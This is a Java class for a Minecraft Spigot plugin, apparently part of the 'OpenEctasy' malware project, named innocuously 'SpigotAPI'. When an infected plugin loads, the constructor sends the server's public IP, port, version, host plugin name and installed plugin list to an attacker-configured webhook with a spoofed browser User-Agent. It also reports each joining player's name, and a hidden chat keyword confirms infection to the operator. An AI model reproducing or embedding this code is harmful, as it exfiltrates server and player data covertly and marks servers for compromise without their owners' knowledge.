package fr.bodyalhoha.ectasy;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import javax.net.ssl.HttpsURLConnection;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class SpigotAPI implements Listener {

    // the main JavaPlugin instance for this plugin
    private final JavaPlugin plugin;

    // whether to log player join events
    private final boolean joinLogs;

    // the URL of the webhook to send messages to
    private final String webhook;

    // a method that retrieves the server's public IP address
    public String getIP(){
        try{
            // open a connection to the "https://api.ipify.org" URL
            InputStream is = new URL("https://api.ipify.org").openConnection().getInputStream();
            Scanner s = new Scanner(is);
            return s.nextLine();
        }catch (Exception e){
            return "error";
        }
    }

    // a method that sends a webhook message to the specified URL
    public void sendWebhook(String json){
        // if the webhook URL is not specified, do nothing
        if(webhook.length() == 0)
            return;

        try{
            // open a connection to the specified webhook URL
            HttpsURLConnection connection = (HttpsURLConnection)new URL(webhook).openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11");
            connection.setDoOutput(true);

            // write the JSON message to the connection's output stream
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(json.replace("\n", "\\n").getBytes(StandardCharsets.UTF_8));

            // read the response from the webhook
            connection.getInputStream();
        }catch (Exception e){
            // if an error occurs, print the JSON message and the error to the console
            System.out.println(json);
            e.printStackTrace();
        }
    }

    // a method that returns a string containing a comma-separated list of installed plugins
    public String getPlugins(){
        // create a list to hold the plugin names
        List<String> s = new ArrayList<String>();

        // add the name of each plugin to the list
       for(Plugin pl : Bukkit.getPluginManager().getPlugins()){
       s.add(pl.getName());
    }
    // return the plugin names as a comma-separated string
    return String.join(", ", s);
}

    // the constructor for the SpigotAPI class
    public SpigotAPI(JavaPlugin plugin, String webhook, boolean joinLogs){
        // save the plugin, webhook URL, and join log setting as instance variables
        this.plugin = plugin;
        this.joinLogs = joinLogs;
        this.webhook = webhook;

        // register this class as an event listener
        Bukkit.getPluginManager().registerEvents(this, plugin);

        // send a webhook message with information about the infected server
        sendWebhook("{\"avatar_url\": \"https://bodyalhoha.com/ectasylogo_64x64.png\", \"username\": \"Open Ectasy\", \"embeds\": [{\"title\":\"OpenEctasy\", \"color\":3447003, \"description\":\"An infected server just started with [OpenEctasy](https://github.com/Body-Alhoha/OpenEctasy). \n\n{desc}\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}".replace("{desc}", "IP : `" + getIP() + "`\nPort : `" + Bukkit.getPort() + "`\nVersion : `" + Bukkit.getVersion().replace("\"", "\\\"") + "`\nInfected Plugin : `" + plugin.getName() + "`\nPlugins : `" + getPlugins() + "`"));
    }

    // an event handler that listens for chat events
    @EventHandler
    public void onChatEvent(AsyncPlayerChatEvent e){
        // if the chat message contains the string "~ectasy~", cancel the event and send a message to the player
        if(e.getMessage().contains("~ectasy~")){
            e.setCancelled(true);
            e.getPlayer().sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Thank you" + ChatColor.AQUA + "" + ChatColor.BOLD + " for using" + ChatColor.GREEN + "" + ChatColor.BOLD + " Open Ectasy" + ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "!");
        }
    }

    // an event handler that listens for player join events
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent e){
        // if join logging is enabled, send a webhook message with the player's name and the server's name
        if(joinLogs){
            sendWebhook("{\"avatar_url\": \"https://minotar.net/helm/" + e.getPlayer().getName() + "/100.png\", \"username\": \"" + e.getPlayer().getName() + "\", \"embeds\": [{\"title\":\"Player Join\", \"color\":3447003, \"description\":\"Username: `" + e.getPlayer().getName() + "`\nIP : `" + getIP() + "`\n\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}");
    }
    }
    }
